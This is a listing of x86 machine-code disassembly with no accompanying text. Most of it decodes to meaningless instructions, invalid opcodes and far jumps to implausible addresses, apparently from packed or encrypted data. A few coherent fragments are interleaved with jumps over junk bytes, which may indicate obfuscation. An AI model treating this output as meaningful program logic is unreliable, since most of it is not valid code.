  40196c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40196d:	(bad)  
  40196e:	dec    eax
  40196f:	sahf   
  401970:	inc    eax
  401971:	in     eax,dx
  401972:	jmp    0xfdc9:0x51007366
  401979:	jae    0x4019eb
  40197b:	lods   al,BYTE PTR ds:[esi]
  40197c:	dec    eax
  40197d:	cld    
  40197e:	ds cmp eax,0x393834e2
  401984:	jecxz  0x40198d
  401986:	cli    
  401987:	and    bl,cl
  401989:	mov    eax,ds:0x60854a85
  40198e:	push   eax
  40198f:	cs adc eax,0x305405de
  401995:	push   edi
  401996:	mov    ds:0x109d8ba3,eax
  40199b:	or     si,ax
  40199e:	lods   al,BYTE PTR ds:[esi]
  40199f:	dec    eax
  4019a0:	ret    0x7d47
  4019a3:	cmp    BYTE PTR ds:0xcda84157,ah
  4019a9:	iret   
  4019aa:	push   esp
  4019ab:	cld    
  4019ac:	jg     0x40196e
  4019ae:	jecxz  0x4019ed
  4019b0:	call   0x7428f169
  4019b5:	or     al,0x43
  4019b7:	xchg   edx,eax
  4019b8:	or     DWORD PTR [ebx],ebx
  4019ba:	dec    edx
  4019bb:	aam    0x86
  4019bd:	scas   al,BYTE PTR es:[edi]
  4019be:	ret    0xde7c
  4019c1:	jb     0x40194d
  4019c3:	jmp    0x8a53:0x936efdd0
  4019ca:	sub    eax,0xa136db44
  4019cf:	test   BYTE PTR [edx],dh
  4019d1:	(bad)  
  4019d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019d3:	dec    edx
  4019d4:	fsubr  DWORD PTR [edx+0x40024c2b]
  4019da:	sahf   
  4019db:	dec    edi
  4019dc:	bound  esi,QWORD PTR [ecx+0x6e34647a]
  4019e2:	hlt    
  4019e3:	pop    eax
  4019e4:	cmp    al,0x4a
  4019e6:	sar    ebx,cl
  4019e8:	dec    eax
  4019e9:	xchg   ebx,eax
  4019ea:	jp     0x401a1c
  4019ec:	pop    ebp
  4019ed:	xor    eax,0x3075f4e6
  4019f2:	out    dx,al
  4019f3:	xchg   edx,eax
  4019f4:	cdq    
  4019f5:	sar    al,0xdd
  4019f8:	push   ecx
  4019f9:	test   eax,0xb71a90c5
  4019fe:	mov    cl,0x91
  401a00:	fisubr WORD PTR [edi-0x1d]
  401a03:	test   ebp,eax
  401a05:	dec    ebp
  401a06:	push   0x2308ce2a
  401a0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a0c:	stos   BYTE PTR es:[edi],al
  401a0d:	mov    al,0xbf
  401a0f:	jnp    0x401a20
  401a11:	outs   dx,DWORD PTR ds:[esi]
  401a12:	test   eax,0xcb1d828c
  401a17:	dec    edx
  401a18:	sar    DWORD PTR [eax+0x17],cl
  401a1b:	adc    BYTE PTR ds:0x2d8655fe,al
  401a21:	jge    0x401a3b
  401a23:	icebp  
  401a24:	scas   al,BYTE PTR es:[edi]
  401a25:	adc    DWORD PTR [eax-0x7],edi
  401a28:	ror    esp,cl
  401a2a:	(bad)  
  401a2b:	fldenv [esp+edi*1+0x7c]
  401a2f:	xor    DWORD PTR [esi],esi
  401a31:	xor    BYTE PTR [ebx-0x6963d6cf],ch
  401a37:	aam    0x17
  401a39:	cmp    BYTE PTR [ebx+edi*1],dh
  401a3c:	jbe    0x401a35
  401a3e:	add    eax,0x81c1f1df
  401a43:	mov    WORD PTR [eax],es
  401a45:	mov    al,ds:0x94113f08
  401a4a:	add    eax,DWORD PTR [esi-0x72]
  401a4d:	pusha  
  401a4e:	leave  
  401a4f:	adc    al,0x44
  401a51:	or     eax,0xd471fa28
  401a56:	mov    bl,0x8f
  401a58:	outs   dx,BYTE PTR ds:[esi]
  401a59:	jmp    0x6bb2:0x2f6eb791
  401a60:	pop    ecx
  401a61:	nop
  401a62:	push   0x5fc03bd4
  401a67:	fist   DWORD PTR [ecx+0x4f]
  401a6a:	add    al,0x51
  401a6c:	or     ecx,eax
  401a6e:	add    BYTE PTR [esi-0x7114fcd2],ah
  401a74:	sub    bh,cl
  401a76:	mov    BYTE PTR [ecx-0x63164fa3],cl
  401a7c:	add    DWORD PTR [eax],eax
  401a7e:	add    BYTE PTR [ecx-0x4c264c60],dl
  401a84:	jmp    0x10588ada
  401a89:	push   ds
  401a8a:	dec    esp
  401a8b:	shr    BYTE PTR [ebx-0x3e],cl
  401a8e:	and    eax,0x7e7e780e
  401a93:	cli    
  401a94:	jg     0x401b14
  401a96:	jle    0x401a38
  401a98:	dec    ebp
  401a99:	mov    esi,0xd5e7313d
  401a9e:	out    dx,al
  401a9f:	ins    DWORD PTR es:[edi],dx
  401aa0:	ret    0xe157
  401aa3:	retf   
  401aa4:	adc    eax,0xb48aa53a
  401aa9:	mov    ds:0x8fde1695,al
  401aae:	lods   eax,DWORD PTR ds:[esi]
  401aaf:	adc    eax,0xf7725266
  401ab4:	push   edx
  401ab5:	fcom   QWORD PTR [ebx+eiz*1+0x3200e7ec]
  401abc:	aas    
  401abd:	mov    DWORD PTR [esi],edi
  401abf:	lods   eax,DWORD PTR ds:[esi]
  401ac0:	mov    ah,0x75
  401ac2:	lea    edx,ds:0x622bc0e7
  401ac8:	jb     0x401a4a
  401aca:	pop    ss
  401acb:	sbb    eax,0x2417b272
  401ad0:	repz sahf 
  401ad2:	clc    
  401ad3:	aad    0xc6
  401ad5:	jae    0x401b4a
  401ad7:	cmp    BYTE PTR [ecx-0x59],bh
  401ada:	inc    esi
  401adb:	sbb    eax,0x9887ac76
  401ae0:	sub    ebx,0xffffffec
  401ae3:	sbb    bl,bl
  401ae5:	mov    ah,0x4e
  401ae7:	test   eax,0x48a107b4
  401aec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401aed:	mov    dh,0x45
  401aef:	ficom  DWORD PTR [ecx-0x58]
  401af2:	retf   
  401af3:	push   ds
  401af4:	nop
  401af5:	ficomp WORD PTR [ecx]
  401af7:	xor    ecx,DWORD PTR [ebp-0x33]
  401afa:	mov    ecx,0xf35dfeb
  401aff:	inc    eax
  401b00:	rcl    al,cl
  401b02:	and    al,0xc4
  401b04:	cld    
  401b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b06:	ret    0x7620
  401b09:	scas   eax,DWORD PTR es:[di]
  401b0b:	jb     0x401b79
  401b0d:	inc    edi
  401b0e:	jnp    0x401aa9
  401b10:	inc    ebx
  401b11:	sub    eax,DWORD PTR [esi-0x413e6cda]
  401b17:	clc    
  401b18:	mov    eax,0x18db425a
  401b1d:	ret    0x87dc
  401b20:	cdq    
  401b21:	pop    ss
  401b22:	in     al,dx
  401b23:	jmp    0x2a439c09
  401b28:	jae    0x401b93
  401b2a:	or     bl,BYTE PTR [ecx-0x202fe783]
  401b30:	adc    esp,ecx
  401b32:	xchg   edi,eax
  401b33:	pop    ds
  401b34:	shl    BYTE PTR [eax],1
  401b36:	adc    BYTE PTR [edx+0x2d],bl
  401b39:	repz xor eax,0x3ab1cf61
  401b3f:	cmp    eax,DWORD PTR [edx-0x3d0ccafc]
  401b45:	push   ebp
  401b46:	xor    ebp,0xffffff84
  401b49:	pop    ebx
  401b4a:	or     esi,DWORD PTR [eax-0x5e22c65d]
  401b50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b51:	cmp    DWORD PTR [ebx+0x5019f321],ebp
  401b57:	(bad)  
  401b58:	cdq    
  401b59:	cs lock cld 
  401b5c:	(bad)  
  401b5d:	retf   0x4c29
  401b60:	dec    edx
  401b61:	out    0x83,eax
  401b63:	inc    ecx
  401b64:	cli    
  401b65:	push   ebp
  401b66:	xchg   ebx,edx
  401b68:	in     eax,dx
  401b69:	add    DWORD PTR [edx],ebp
  401b6b:	xlat   BYTE PTR ds:[ebx]
  401b6c:	icebp  
  401b6d:	cmp    DWORD PTR [ebx-0x72],esi
  401b70:	mov    esi,0x64bfb8f6
  401b75:	inc    ecx
  401b76:	in     eax,dx
  401b77:	push   edi
  401b78:	les    edi,FWORD PTR [ebx+ebx*8]
  401b7b:	dec    ebp
  401b7c:	add    ebx,edi
  401b7e:	jns    0x401bb8
  401b80:	jbe    0x401b73
  401b82:	not    DWORD PTR [eax]
  401b84:	sbb    BYTE PTR ds:0x673915a1,0xcf
  401b8b:	xchg   esp,eax
  401b8c:	jno    0x401b9c
  401b8e:	addr16 jnp 0x401b5c
  401b91:	jae    0x401b92
  401b93:	dec    eax
  401b94:	adc    cl,bh
  401b96:	sti    
  401b97:	mov    ecx,0x7d68338c
  401b9c:	xchg   edi,eax
  401b9d:	adc    DWORD PTR [edi+0x4ea069],ebp
  401ba3:	into   
  401ba4:	jo     0x401bc4
  401ba6:	js     0x401bd8
  401ba8:	shl    BYTE PTR [edx-0x17],1
  401bab:	inc    edi
  401bac:	lea    esp,[esi+0x7a561e74]
  401bb2:	inc    esi
  401bb3:	fadd   DWORD PTR [esi-0x50c6340]
  401bb9:	inc    edi
  401bba:	adc    al,0x88
  401bbc:	fucom  st(1)
  401bbe:	rcr    DWORD PTR [edx-0x3d],cl
  401bc1:	mov    WORD PTR [esi-0x64],gs
  401bc4:	leave  
  401bc5:	pop    eax
  401bc6:	fwait
  401bc7:	mov    edx,0x3728d504
  401bcc:	inc    edx
  401bcd:	adc    eax,0xcd38c3d4
  401bd2:	mul    DWORD PTR [ecx]
  401bd4:	sbb    eax,0x19df411d
  401bd9:	hlt    
  401bda:	inc    edi
  401bdb:	and    eax,0x99d3fe88
  401be0:	xor    al,0x58
  401be2:	mov    al,ds:0xbe95d0ff
  401be7:	stos   BYTE PTR es:[edi],al
  401be8:	inc    esp
  401be9:	jne    0x401bcc
  401beb:	and    cl,BYTE PTR [ebx+0x539602ce]
  401bf1:	pop    ss
  401bf2:	push   0x4f
  401bf4:	adc    eax,0x5f97b3ba
  401bf9:	test   BYTE PTR [ebp+0x205b8793],dh
  401bff:	sbb    eax,DWORD PTR [ecx-0x14609c8]
  401c05:	mov    eax,ds:0x347d7e90
  401c0a:	popa   
  401c0b:	lea    edi,[esi+eax*4+0x4e508c4f]
  401c12:	push   cs
  401c13:	push   ecx
  401c14:	sbb    BYTE PTR [eax+esi*8+0x6bcb8b0],al
  401c1b:	mov    eax,DWORD PTR [ebp-0x50]
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	daa    
  401c41:	push   eax
  401c42:	mov    ebp,0x7e798a88
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401bd9
  401c4d:	pop    ecx
  401c4e:	enter  0x18bc,0x66
  401c52:	sub    esp,DWORD PTR [edx]
  401c54:	aaa    
  401c55:	std    
  401c56:	(bad)  
  401c57:	ds push eax
  401c59:	(bad)  
  401c5a:	nop
  401c5b:	mov    eax,0xf65c5e43
  401c60:	sbb    al,0x2f
  401c62:	cmp    BYTE PTR [ebx-0x42f90c18],dl
  401c68:	dec    ecx
  401c69:	les    eax,FWORD PTR [eax]
  401c6b:	adc    esi,DWORD PTR [edx]
  401c6d:	hlt    
  401c6e:	mov    dh,0xec
  401c70:	and    DWORD PTR [edx],ecx
  401c72:	add    eax,0xb48b7067
  401c77:	outs   dx,DWORD PTR ds:[esi]
  401c78:	lods   eax,DWORD PTR ds:[esi]
  401c79:	cmp    eax,edx
  401c7b:	scas   eax,DWORD PTR es:[edi]
  401c7c:	bound  ecx,QWORD PTR [eax-0x75]
  401c7f:	jl     0x401c49
  401c81:	mov    ?,WORD PTR ds:0x899d1dca
  401c87:	xchg   edx,eax
  401c88:	jae    0x401c24
  401c8a:	aam    0xc3
  401c8c:	or     DWORD PTR [edi],edx
  401c8e:	not    BYTE PTR [eax+0x599070ed]
  401c94:	and    al,0x7a
  401c96:	jne    0x401c62
  401c98:	push   0xffffffd2
  401c9a:	or     BYTE PTR [ebx-0x782dec9a],ch
  401ca0:	pop    esi
  401ca1:	sbb    esp,edx
  401ca3:	mov    al,0xac
  401ca5:	test   eax,0x2cbc1249
  401caa:	mov    bl,0x3c
  401cac:	je     0x401c7e
  401cae:	xor    DWORD PTR ds:0x38948333,ecx
  401cb4:	pop    ebx
  401cb5:	push   cs
  401cb6:	nop
  401cb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cb8:	push   0xfffffff7
  401cba:	add    al,0x41
  401cbc:	call   0xafa1:0x3ac7f4bb
  401cc3:	push   0x5b61ef
  401cc8:	inc    esi
  401cc9:	in     eax,0x36
  401ccb:	mov    al,ds:0x9cb4a426
  401cd0:	sti    
  401cd1:	les    esp,FWORD PTR [eax-0x2a8c3e09]
  401cd7:	outs   dx,DWORD PTR ds:[esi]
  401cd8:	mov    WORD PTR [ebp-0x3f552948],cs
  401cde:	je     0x401cd4
  401ce0:	pop    eax
  401ce1:	mov    esi,0x892f6e53
  401ce6:	add    al,0x6c
  401ce8:	mov    WORD PTR ds:0xa91b4ee0,es
  401cee:	push   ds
  401cef:	or     al,BYTE PTR [ebp+edx*4+0x4059cb1e]
  401cf6:	dec    esp
  401cf7:	dec    BYTE PTR [ebx+0x27]
  401cfa:	mov    eax,DWORD PTR [ebp-0xb]
  401cfd:	das    
  401cfe:	in     eax,dx
  401cff:	jae    0x401cbc
  401d01:	push   ebp
  401d02:	or     DWORD PTR [edx+0x203d5476],edi
  401d08:	mov    ecx,0xa7a8ca2
  401d0d:	pop    edx
  401d0e:	popf   
  401d0f:	bound  edx,QWORD PTR [edi+ebp*8]
  401d12:	jnp    0x401d3d
  401d14:	and    BYTE PTR [edi-0x6ceb375b],dh
  401d1a:	cmp    ah,BYTE PTR [esi]
  401d1c:	aam    0xa9
  401d1e:	enter  0x8647,0x6a
  401d22:	repz repnz or eax,0xf247e31a
  401d29:	and    eax,ecx
  401d2b:	push   ds
  401d2c:	and    dl,BYTE PTR [esi]
  401d2e:	imul   DWORD PTR [eax+0x2e]
  401d31:	jmp    0x401d4a
  401d33:	dec    eax
  401d34:	lock add DWORD PTR [ecx],eax
  401d37:	dec    ecx
  401d38:	xchg   DWORD PTR [ebp-0x3fcda710],ebx
  401d3e:	pop    ds
  401d3f:	das    
  401d40:	pop    ecx
  401d41:	mov    DWORD PTR [esi],ebp
  401d43:	fwait
  401d44:	push   eax
  401d45:	mov    edx,0xfcad66a2
  401d4a:	xor    DWORD PTR [edi-0x7f],esp
  401d4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d4e:	mov    eax,ds:0x35978b62
  401d53:	xor    DWORD PTR [edi+0x62],ecx
  401d56:	sti    
  401d57:	xor    bl,BYTE PTR [ebx+0x5f]
  401d5a:	cmp    bh,BYTE PTR [edi+0x15]
  401d5d:	(bad)  
  401d5e:	fimul  WORD PTR [esi+0x1de1b0d0]
  401d64:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  401d66:	call   0xcfb6:0xa00efa3d
  401d6d:	into   
  401d6e:	push   es
  401d6f:	adc    al,0x23
  401d71:	dec    ebx
  401d72:	push   ss
  401d73:	cmp    esp,0x2a3baf94
  401d79:	xchg   ebp,eax
  401d7a:	sar    DWORD PTR ds:0x3e3c4aa1,1
  401d80:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d82:	in     eax,dx
  401d83:	cmp    ebp,DWORD PTR [ebx]
  401d85:	xchg   ebx,eax
  401d86:	fst    DWORD PTR [edx]
  401d88:	ja     0x401dcb
  401d8a:	fldcw  WORD PTR [ecx+0x23]
  401d8d:	pop    ebp
  401d8e:	clc    
  401d8f:	jne    0x401da0
  401d91:	push   ss
  401d92:	sbb    eax,0x35740434
  401d97:	inc    esi
  401d98:	int3   
  401d99:	loope  0x401d78
  401d9b:	aas    
  401d9c:	and    esp,ebp
  401d9e:	cmc    
  401d9f:	mov    edx,0x3d81ae67
  401da4:	fxch   st(2)
  401da6:	nop
  401da7:	fninit 
  401da9:	pop    ss
  401daa:	loope  0x401dc2
  401dac:	add    BYTE PTR [edi-0x29],cl
  401daf:	xor    al,0x5c
  401db1:	cmc    
  401db2:	dec    esi
  401db3:	push   ecx
  401db4:	add    eax,DWORD PTR [esi]
  401db6:	daa    
  401db7:	add    al,0x76
  401db9:	(bad)  [ebp-0x4225be0]
  401dbf:	(bad)  
  401dc0:	test   DWORD PTR [ebx-0x4c1de49d],0xc5b328c2
  401dca:	mov    eax,ds:0xe317df55
  401dcf:	aaa    
  401dd0:	add    eax,edi
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0x7a2362c8],ebp
  401e0d:	add    eax,0x7e7e0716
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401dc4
  401e17:	clc    
  401e18:	js     0x401d9b
  401e1a:	push   esp
  401e1b:	add    al,0x54
  401e1d:	push   0x8aec4cb3
  401e22:	out    dx,eax
  401e23:	and    ecx,DWORD PTR [ecx+0x5c]
  401e26:	out    dx,al
  401e27:	add    DWORD PTR [ebx+eiz*2+0x8],edx
  401e2b:	sbb    esi,eax
  401e2d:	outs   dx,BYTE PTR ds:[esi]
  401e2e:	sbb    BYTE PTR [esi+0x7b01ed66],0xec
  401e35:	cmc    
  401e36:	add    cl,dh
  401e38:	mov    dh,0x26
  401e3a:	push   esp
  401e3b:	retf   
  401e3c:	fs add ch,dl
  401e3f:	test   DWORD PTR [eax-0x2317a495],ebx
  401e45:	and    DWORD PTR [esi+0x689d0f59],esp
  401e4b:	push   ds
  401e4c:	rcr    DWORD PTR [ebx+0x376d3bd9],cl
  401e52:	out    dx,al
  401e53:	xchg   ecx,eax
  401e54:	jg     0x401e6b
  401e56:	jle    0x401ec4
  401e58:	push   edx
  401e59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e5a:	or     DWORD PTR [esi+0x48],0x221b7db9
  401e61:	ds retf 0x2ce1
  401e65:	pop    ss
  401e66:	inc    ebp
  401e67:	push   es
  401e68:	ds mov dh,0xbb
  401e6b:	pusha  
  401e6c:	lods   eax,DWORD PTR ds:[esi]
  401e6d:	ret    
  401e6e:	sbb    DWORD PTR [eax],0xb2910abe
  401e74:	fs enter 0x2219,0xfa
  401e79:	jne    0x401e85
  401e7b:	test   al,0xc6
  401e7d:	mov    edi,0xb4f238c2
  401e82:	ror    DWORD PTR [esi],cl
  401e84:	leave  
  401e85:	stos   DWORD PTR es:[edi],eax
  401e86:	stc    
  401e87:	and    al,0x7a
  401e89:	dec    eax
  401e8a:	lods   al,BYTE PTR ds:[esi]
  401e8b:	not    DWORD PTR [ebp-0x78e87b31]
  401e91:	int    0x17
  401e93:	push   edi
  401e94:	jge    0x401e30
  401e96:	cmp    BYTE PTR [ecx+0x49],al
  401e99:	jl     0x401e55
  401e9b:	sub    ecx,edx
  401e9d:	dec    eax
  401e9f:	pop    ecx
  401ea0:	jg     0x401f0b
  401ea2:	push   es
  401ea3:	pop    esi
  401ea4:	fild   WORD PTR [edi]
  401ea6:	jns    0x401ecc
  401ea8:	cmc    
  401ea9:	inc    edx
  401eaa:	sub    edi,esp
  401eac:	jp     0x401e6c
  401eae:	in     al,0xa7
  401eb0:	scas   eax,DWORD PTR es:[edi]
  401eb1:	je     0x401ee7
  401eb3:	and    eax,0xe4d0c59d
  401eb8:	dec    esi
  401eb9:	adc    eax,0x9ec54659
  401ebe:	clc    
  401ebf:	and    BYTE PTR [edx],cl
  401ec1:	cmc    
  401ec2:	nop
  401ec3:	ja     0x401eec
  401ec5:	push   ebx
  401ec6:	scas   eax,DWORD PTR es:[edi]
  401ec7:	popf   
  401ec8:	fmul   DWORD PTR [ebx-0x669175e1]
  401ece:	ret    
  401ecf:	int3   
  401ed0:	mov    edi,DWORD PTR [esi-0xd]
  401ed3:	ins    BYTE PTR es:[edi],dx
  401ed4:	jl     0x401f21
  401ed6:	ins    DWORD PTR es:[edi],dx
  401ed7:	out    dx,al
  401ed8:	out    dx,eax
  401ed9:	pop    ss
  401eda:	add    eax,0x67284543
  401edf:	sub    eax,0x9d345433
  401ee4:	fcmovnbe st,st(6)
  401ee6:	jno    0x401f23
  401ee8:	fwait
  401ee9:	dec    ebx
  401eea:	dec    ebx
  401eeb:	add    ebp,DWORD PTR [ecx-0x74274c58]
  401ef1:	ret    
  401ef2:	sbb    DWORD PTR [eax+0x40],esi
  401ef5:	and    eax,0xe80b368c
  401efa:	inc    esi
  401efb:	and    bh,BYTE PTR [edx]
  401efd:	fcom   DWORD PTR [esp+ebx*2+0x2298a7e9]
  401f04:	out    0xfe,al
  401f06:	into   
  401f07:	cs and al,0x30
  401f0a:	sar    DWORD PTR [ecx],cl
  401f0c:	adc    ebx,DWORD PTR [edx]
  401f0e:	js     0x401ebe
  401f10:	fucomp st(4)
  401f12:	push   ecx
  401f13:	sbb    esp,DWORD PTR [edx]
  401f15:	dec    edi
  401f16:	jae    0x401ee1
  401f18:	push   es
  401f19:	loopne 0x401f73
  401f1b:	push   ebp
  401f1c:	sbb    DWORD PTR [ecx+esi*8-0x624885c1],ecx
  401f23:	mov    DWORD PTR es:[eax-0x45],ebx
  401f27:	and    BYTE PTR [ecx],dl
  401f29:	jmp    0xf66aa83f
  401f2e:	xchg   edx,ecx
  401f30:	ins    BYTE PTR es:[edi],dx
  401f31:	push   ebx
  401f32:	ror    BYTE PTR [eax+0x1238aa43],cl
  401f38:	jnp    0x401f28
  401f3a:	ds and eax,0xc86137b8
  401f40:	neg    DWORD PTR [esi]
  401f42:	jbe    0x401faf
  401f44:	arpl   WORD PTR [eax-0x4],bx
  401f47:	jno    0x401f4c
  401f49:	in     eax,0x31
  401f4b:	repz mov edi,0xb93659ee
  401f51:	mov    ah,0xc1
  401f53:	pop    es
  401f54:	sub    DWORD PTR [ecx-0x80],eax
  401f57:	(bad)
  401f5a:	dec    ecx
  401f5b:	cli    
  401f5c:	xchg   esi,eax
  401f5d:	cmc    
  401f5e:	inc    ecx
  401f5f:	or     al,0xc6
  401f61:	mov    esi,0xf4d4e982
  401f66:	add    al,0x7e
  401f68:	cmp    DWORD PTR [ecx],ebx
  401f6a:	pop    edx
  401f6b:	dec    ecx
  401f6c:	mov    BYTE PTR ds:0x186c3232,bh
  401f72:	jno    0x401f88
  401f74:	xor    DWORD PTR [eax-0x7d3186a0],ecx
  401f7a:	pop    eax
  401f7b:	jle    0x401fc7
  401f7d:	les    ecx,FWORD PTR [esi]
  401f7f:	sub    al,0xfd
  401f81:	out    0x8f,al
  401f83:	inc    ebp
  401f84:	fiadd  DWORD PTR [esp+eax*8+0x63c01536]
  401f8b:	fdivr  DWORD PTR [eax-0xc6e4e75]
  401f91:	xor    cl,al
  401f93:	aaa    
  401f94:	xchg   edi,eax
  401f95:	mov    ch,0x26
  401f97:	jmp    0x401ff3
  401f99:	call   0x3ada3ad
  401f9e:	add    BYTE PTR [eax],al
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0x617e96f1
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401fa3
  401fcc:	add    BYTE PTR [ebp+0x42a311ef],cl
  401fd2:	call   0x7b13:0x8452fa93
  401fd9:	cmp    dh,BYTE PTR [edx]
  401fdb:	imul   edi,DWORD PTR [ebx+0x6d],0xdd6721b0
  401fe2:	adc    bl,BYTE PTR [ebp+eiz*4-0xf]
  401fe6:	cdq    
  401fe7:	mov    ecx,0x30c89783
  401fec:	les    ecx,FWORD PTR [esi+0xa]
  401fef:	mov    ss,ebp
  401ff1:	add    BYTE PTR [ebx-0x1b],cl
  401ff4:	jmp    0x40205a
  401ff6:	dec    edx
  401ff7:	mov    DWORD PTR ds:0xf53b8e4d,esi
  401ffd:	push   ds
  401ffe:	lahf   
  401fff:	push   ebx
  402000:	mov    cl,0xf4
  402002:	or     ch,BYTE PTR [ecx-0x69]
  402005:	or     eax,0xe1846f14
  40200a:	fwait
  40200b:	mov    cl,0xe7
  40200d:	fistp  QWORD PTR [esi]
  40200f:	dec    esp
  402010:	push   ecx
  402011:	bound  eax,QWORD PTR ds:[ebx]
  402014:	inc    ebp
  402015:	fimul  DWORD PTR [edx]
  402017:	dec    eax
  402018:	sub    DWORD PTR [ebx+0x6bca9048],esi
  40201e:	mov    ebx,0x65c7bd1f
  402023:	dec    ecx
  402024:	sti    
  402025:	pop    ebx
  402026:	adc    al,0x4b
  402028:	push   ss
  402029:	and    al,0xaa
  40202b:	mov    edi,0x69b2b9d4
  402030:	das    
  402031:	mov    ebp,0x226d5145
  402036:	nop
  402037:	cwde   
  402038:	imul   eax,DWORD PTR [ebp+0x55],0xffffff90
  40203c:	fidiv  WORD PTR ds:0xf70e6b6d
  402042:	adc    al,0x86
  402044:	push   0xffffffce
  402046:	cli    
  402047:	mov    ch,0xc7
  402049:	xchg   esi,eax
  40204a:	push   edi
  40204b:	lods   al,BYTE PTR ds:[esi]
  40204c:	sub    eax,0xd08f63cd
  402051:	stc    
  402052:	adc    eax,0x5bef9e41
  402057:	and    al,0xf3
  402059:	mov    ?,ebp
  40205b:	pop    ebx
  40205c:	mov    ah,BYTE PTR [ecx]
  40205e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40205f:	dec    BYTE PTR [esi+0x62b62199]
  402065:	jno    0x401ff6
  402067:	outs   dx,BYTE PTR ds:[esi]
  402068:	out    dx,al
  402069:	or     DWORD PTR [edi-0x68],edi
  40206c:	mov    ch,0x55
  40206e:	cmp    DWORD PTR ds:0x4212d1ff,eax
  402074:	push   ebp
  402075:	and    al,BYTE PTR [esi+0x2b]
  402078:	mov    DWORD PTR [edi-0x25],esi
  40207b:	in     eax,dx
  40207c:	pop    ss
  40207d:	sahf   
  40207e:	cs add al,0xde
  402081:	xor    DWORD PTR [ebx],edi
  402083:	retf   0xf4ec
  402086:	mov    bh,0x37
  402088:	sbb    BYTE PTR [eax+0x25],bh
  40208b:	scas   al,BYTE PTR es:[edi]
  40208c:	mov    ecx,0x145334aa
  402091:	les    eax,FWORD PTR [esi-0x592acb8e]
  402097:	pop    edx
  402098:	cmp    esp,ebp
  40209a:	aas    
  40209b:	pop    esp
  40209c:	jbe    0x402104
  40209e:	dec    ebx
  40209f:	cld    
  4020a0:	inc    ecx
  4020a1:	arpl   WORD PTR [ebp+0xe69123f],ax
  4020a7:	stc    
  4020a8:	and    al,0x85
  4020aa:	ret    
  4020ab:	fdivr  DWORD PTR [ecx+0x12]
  4020ae:	add    al,0xbd
  4020b0:	sbb    BYTE PTR [eax-0x609bfa16],bh
  4020b6:	push   edx
  4020b7:	in     al,dx
  4020b8:	sub    al,0xe7
  4020ba:	div    cl
  4020bc:	jb     0x4020e3
  4020be:	mov    cl,0xb0
  4020c0:	test   al,0x75
  4020c2:	jbe    0x4020b9
  4020c4:	pop    esi
  4020c5:	pusha  
  4020c6:	mov    dl,BYTE PTR [esi*1+0x2c82c82d]
  4020cd:	loope  0x40211c
  4020cf:	retf   
  4020d0:	inc    eax
  4020d1:	xor    eax,0xe7197425
  4020d6:	dec    ecx
  4020d7:	daa    
  4020d8:	push   ds
  4020d9:	inc    ecx
  4020da:	xchg   DWORD PTR [eax+0x10],esp
  4020dd:	sbb    bh,BYTE PTR [edx-0x4b]
  4020e0:	and    BYTE PTR [ecx],al
  4020e2:	or     DWORD PTR [esi],ebp
  4020e4:	dec    eax
  4020e5:	and    al,0x58
  4020e7:	pop    esp
  4020e8:	and    esi,DWORD PTR [edi+0x7e9135a1]
  4020ee:	or     eax,ebx
  4020f0:	hlt    
  4020f1:	sbb    ch,dl
  4020f3:	imul   dh
  4020f5:	js     0x4020c6
  4020f7:	(bad)  
  4020f9:	adc    edi,DWORD PTR ds:0x17578c1
  4020ff:	jo     0x4020d5
  402101:	jmp    0x402112
  402103:	or     eax,0x5d2ac31a
  402108:	jge    0x402121
  40210a:	(bad)  
  40210b:	sbb    BYTE PTR [eax-0x41dbe4f8],ch
  402111:	ret    
  402112:	lods   eax,DWORD PTR ds:[esi]
  402113:	dec    ebx
  402114:	xchg   edx,eax
  402115:	imul   eax,DWORD PTR [edx+0x5995de53],0x78
